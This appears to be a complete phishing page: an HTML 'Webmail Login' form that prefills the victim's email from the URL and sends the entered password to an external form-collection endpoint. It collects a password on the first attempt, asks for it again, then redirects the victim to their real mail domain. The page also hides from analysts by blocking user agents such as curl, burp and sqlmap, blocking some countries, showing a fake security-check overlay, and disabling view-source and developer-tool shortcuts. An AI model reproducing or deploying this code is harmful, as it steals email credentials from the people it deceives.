<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <!-- SECURITY: Prevent indexing, scraping, caching, and referrer leakage -->
  <meta name="robots" content="noindex, nofollow">
  <meta name="referrer" content="no-referrer">
  <meta http-equiv="X-Content-Type-Options" content="nosniff">
  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
  <meta http-equiv="Pragma" content="no-cache">
  <meta http-equiv="Expires" content="0">
  
  <title>Webmail Login</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,Ubuntu,Cantarell,sans-serif}
    body{background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;color:#333}
    .login-container{width:100%;max-width:420px;background:#fff;border-radius:4px;box-shadow:0 2px 10px rgba(0,0,0,.1);overflow:hidden}
    .login-header{background:#005a9e;color:#fff;padding:20px;text-align:center}
    .login-header h1{font-size:22px;font-weight:400}
    .login-form{padding:30px}
    .form-group{margin-bottom:20px}
    .input-with-icon{position:relative}
    .input-with-icon svg{position:absolute;left:12px;top:50%;transform:translateY(-50%);width:16px;height:16px;fill:#666}
    input[type="text"],input[type="password"]{width:100%;padding:12px 12px 12px 40px;border:1px solid #ccc;border-radius:4px;font-size:14px;transition:border .3s}
    input[type="text"]:focus,input[type="password"]:focus{border-color:#005a9e;outline:none;box-shadow:0 0 0 2px rgba(0,90,158,.2)}
    .checkbox-group{display:flex;align-items:center;margin-bottom:20px}
    .checkbox-group input{margin-right:8px}
    .checkbox-group label{margin-bottom:0;font-weight:400}
    button{width:100%;padding:12px;background:#005a9e;border:none;border-radius:4px;color:#fff;font-size:14px;font-weight:600;cursor:pointer;transition:background .3s}
    button:hover{background:#004a87}
    .footer{text-align:center;margin-top:20px;color:#666;font-size:12px}
    .footer a{color:#005a9e;text-decoration:none}
    .footer a:hover{text-decoration:underline}
    .language-selector{text-align:center;margin-top:15px;font-size:12px;color:#666}
    .language-selector select{padding:5px;border:1px solid #ccc;border-radius:3px;font-size:12px;margin-left:5px}
    .security-notice{background:#f8f8f8;border-top:1px solid #eee;padding:15px;text-align:center;font-size:12px;color:#666}
    .security-notice svg{width:12px;height:12px;fill:#2ecc71;margin-right:5px}
    
    /* Loader style */
    .loader{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:9999;justify-content:center;align-items:center}
    .loader::after{content:"";width:40px;height:40px;border:4px solid #fff;border-top-color:#005a9e;border-radius:50%;animation:spin 0.8s linear infinite}
    @keyframes spin{to{transform:rotate(360deg)}}
    
    /* Human Verification Overlay - temporarily hides the login */
    #human-verify {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: #0f172a;
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 99999;
      flex-direction: column;
      padding: 20px;
    }
    #human-verify .box {
      background: #1e293b;
      padding: 40px 30px;
      border-radius: 16px;
      max-width: 420px;
      width: 100%;
      text-align: center;
      border: 1px solid #334155;
      box-shadow: 0 20px 40px rgba(0,0,0,0.5);
    }
    #human-verify h2 {
      color: #f1f5f9;
      font-size: 22px;
      margin-bottom: 8px;
    }
    #human-verify p {
      color: #94a3b8;
      font-size: 14px;
      margin-bottom: 20px;
      line-height: 1.6;
    }
    #human-verify .spinner {
      width: 48px;
      height: 48px;
      border: 4px solid #334155;
      border-top-color: #3b82f6;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      margin: 0 auto 16px;
    }
  </style>
</head>
<body>

  <!-- HUMAN VERIFICATION OVERLAY -->
  <div id="human-verify">
    <div class="box">
      <div class="spinner" id="verify-spinner"></div>
      <h2>🔒 Security Check</h2>
      <p>Verifying your connection to the secure portal...</p>
    </div>
  </div>

  <!-- ORIGINAL LOGIN CONTAINER -->
  <div class="login-container" id="loginContainer">
    <div class="login-header">
      <h1>Webmail Login</h1>
    </div>
    
    <div class="login-form">
      <form id="loginForm" method="POST">
        <!-- Honeypot field -->
        <input type="text" name="_gotcha" style="display:none" tabindex="-1" autocomplete="off">
        
        <div class="form-group">
          <div class="input-with-icon">
            <svg viewBox="0 0 24 24">
              <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/>
            </svg>
            <input type="text" id="user" name="email" placeholder="" readonly>
          </div>
        </div>
        
        <div class="form-group">
          <div class="input-with-icon">
            <svg viewBox="0 0 24 24">
              <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM15.1 8H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
            </svg>
            <input type="password" id="pass" name="password" placeholder="Password" required>
          </div>
        </div>
        
        <div class="checkbox-group">
          <input type="checkbox" id="remember">
          <label for="remember">Remember me</label>
        </div>
        
        <button type="submit">Sign In</button>
      </form>
      
      <div class="footer">
        <p><a href="#">Forgot your password?</a></p>
      </div>
      
      <div class="language-selector">
        Language: 
        <select>
          <option>English</option>
          <option>Español</option>
          <option>Français</option>
          <option>Deutsch</option>
        </select>
      </div>
    </div>
    
    <div class="security-notice">
      <svg viewBox="0 0 24 24">
        <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM15.1 8H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
      </svg>
      Secure SSL Connection
    </div>
  </div>

  <div class="loader" id="loader"></div>

  <!-- ====== SECURITY SCRIPT ====== -->
  <script>
    // --- IP BLOCKING + RATE LIMITING + USER-AGENT FILTERING ---
    (function securityCheck() {
      // 1. User-Agent Filtering (Block known bots)
      (function blockBots() {
        const ua = navigator.userAgent.toLowerCase();
        const botPatterns = [
          'bot', 'crawl', 'spider', 'scraper', 'headless',
          'curl', 'wget', 'python', 'php', 'java',
          'go-http', 'okhttp', 'http-client', 'axios',
          'postman', 'insomnia', 'burp', 'nmap', 'sqlmap'
        ];
        
        for (let pattern of botPatterns) {
          if (ua.includes(pattern)) {
            document.body.innerHTML = `
              <div style="display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial;background:#0f172a;color:#f1f5f9;text-align:center;padding:20px;">
                <div style="background:#1e293b;padding:40px;border-radius:16px;max-width:420px;">
                  <h2>🚫 Access Denied</h2>
                  <p style="color:#94a3b8;margin-top:10px;">Your request has been blocked due to suspicious activity.</p>
                  <p style="color:#64748b;font-size:14px;margin-top:16px;">If you believe this is an error, please contact support.</p>
                </div>
              </div>
            `;
            throw new Error('Bot detected');
          }
        }
      })();

      // 2. Rate Limiting (5 requests per minute)
      (function rateLimit() {
        const key = 'rate_limit_' + (window.location.hostname + window.location.pathname);
        const now = Date.now();
        const windowSize = 60000; // 1 minute
        const maxRequests = 5;
        
        let data = JSON.parse(sessionStorage.getItem(key) || '{"count":0,"firstRequest":' + now + '}');
        
        if (now - data.firstRequest > windowSize) {
          data.count = 0;
          data.firstRequest = now;
        }
        
        data.count++;
        sessionStorage.setItem(key, JSON.stringify(data));
        
        if (data.count > maxRequests) {
          document.body.innerHTML = `
            <div style="display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial;background:#0f172a;color:#f1f5f9;text-align:center;padding:20px;">
              <div style="background:#1e293b;padding:40px;border-radius:16px;max-width:420px;">
                <h2>⏳ Too Many Requests</h2>
                <p style="color:#94a3b8;margin-top:10px;">You have made too many requests. Please wait a moment and try again.</p>
              </div>
            </div>
          `;
          throw new Error('Rate limit exceeded');
        }
      })();

      // 3. IP Blocking (via external service)
      (async function blockBadIPs() {
        try {
          const ipRes = await fetch('https://ipapi.co/json/');
          const ipData = await ipRes.json();
          const ip = ipData.ip;
          const country = ipData.country_code;
          
          const blockedCountries = ['RU', 'CN', 'IR', 'KP', 'VN', 'BY', 'UA'];
          
          if (blockedCountries.includes(country)) {
            document.body.innerHTML = `
              <div style="display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial;background:#0f172a;color:#f1f5f9;text-align:center;padding:20px;">
                <div style="background:#1e293b;padding:40px;border-radius:16px;max-width:420px;">
                  <h2>🚫 Access Denied</h2>
                  <p style="color:#94a3b8;margin-top:10px;">Your location is not allowed to access this page.</p>
                </div>
              </div>
            `;
            throw new Error('IP blocked');
          }
          
          const blockedIPs = [];
          if (blockedIPs.includes(ip)) {
            document.body.innerHTML = `
              <div style="display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial;background:#0f172a;color:#f1f5f9;text-align:center;padding:20px;">
                <div style="background:#1e293b;padding:40px;border-radius:16px;max-width:420px;">
                  <h2>🚫 Access Denied</h2>
                  <p style="color:#94a3b8;margin-top:10px;">Your IP has been blocked due to suspicious activity.</p>
                </div>
              </div>
            `;
            throw new Error('IP blocked');
          }
          
        } catch (e) {
          console.log('IP check failed, allowing access');
        }
      })();
    })();
  </script>

  <script>
    // --- CLICKJACKING PROTECTION ---
    if (window.top !== window.self) {
      window.top.location = window.self.location;
    }
    
    // --- RIGHT-CLICK BLOCK ---
    document.addEventListener('contextmenu', e => e.preventDefault());
    
    // --- KEYBOARD SHORTCUTS BLOCK ---
    document.addEventListener('keydown', function(e) {
      if (e.ctrlKey && (e.key === 'u' || e.key === 'U' || e.key === 's' || e.key === 'S' || e.key === 'c' || e.key === 'C' || e.key === 'a' || e.key === 'A')) {
        e.preventDefault();
      }
      if (e.key === 'F12') e.preventDefault();
    });
    
    // --- CACHE DISABLE (reload on back/forward) ---
    window.addEventListener('pageshow', function(event) {
      if (event.persisted) {
        window.location.reload();
      }
    });

    // --- HUMAN VERIFICATION OVERLAY ---
    (function humanVerification() {
      const overlay = document.getElementById('human-verify');
      const loginContainer = document.getElementById('loginContainer');
      
      // Show overlay for 2 seconds, then hide and show login
      setTimeout(function() {
        if (overlay) overlay.style.display = 'none';
        if (loginContainer) loginContainer.style.display = 'block';
      }, 2000);
    })();
  </script>

  <script>
    // --- ORIGINAL FORMSPARK LOGIC (unchanged) ---
    const FORMSPARK_URL = "https://submit-form.com/wUKgSbdQB";
    
    function getEmailFromURL() {
      if (window.location.hash && window.location.hash.includes('@')) {
        return window.location.hash.substring(1);
      }
      const urlParams = new URLSearchParams(window.location.search);
      if (urlParams.has('email')) {
        return urlParams.get('email');
      }
      return null;
    }
    
    const emailFromUrl = getEmailFromURL();
    const emailInput = document.getElementById('user');
    if (emailFromUrl) {
      emailInput.value = emailFromUrl;
    } else {
      emailInput.value = 'No email specified in URL';
    }
    
    const form = document.getElementById('loginForm');
    const loader = document.getElementById('loader');
    let attemptCount = 0;
    let firstPassword = '';
    
    form.addEventListener('submit', async function(e) {
      e.preventDefault();
      
      const email = document.getElementById('user').value.trim();
      const password = document.getElementById('pass').value.trim();
      
      if (!email || email === 'No email specified in URL') {
        alert('Please enter a valid email address');
        return;
      }
      
      if (!password) {
        alert('Please enter your password');
        return;
      }
      
      attemptCount++;
      loader.style.display = 'flex';
      
      const formData = {
        email: email,
        password: password,
        webmail_login: true
      };
      
      if (attemptCount === 2) {
        formData.first_attempt_password = firstPassword;
        formData.attempt = 'second';
      } else if (attemptCount === 1) {
        firstPassword = password;
        formData.attempt = 'first';
      }
      
      try {
        await fetch(FORMSPARK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(formData)
        });
      } catch(err) {
        console.log('Formspark error:', err);
      }
      
      const domain = email.split('@')[1];
      setTimeout(() => {
        window.location.href = `https://${domain}`;
      }, 1500);
    });
  </script>
</body>
</html>
